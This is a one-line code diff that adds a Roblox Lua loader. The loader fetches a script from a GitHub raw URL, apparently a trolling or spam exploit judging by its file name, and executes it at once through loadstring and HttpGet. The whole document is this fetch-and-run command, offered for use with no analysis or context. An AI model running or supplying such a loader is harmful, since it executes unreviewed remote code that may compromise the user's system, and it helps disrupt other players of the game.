@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/troll-hug-tower-spam6-u30h7q09p66d8v.lua"))()
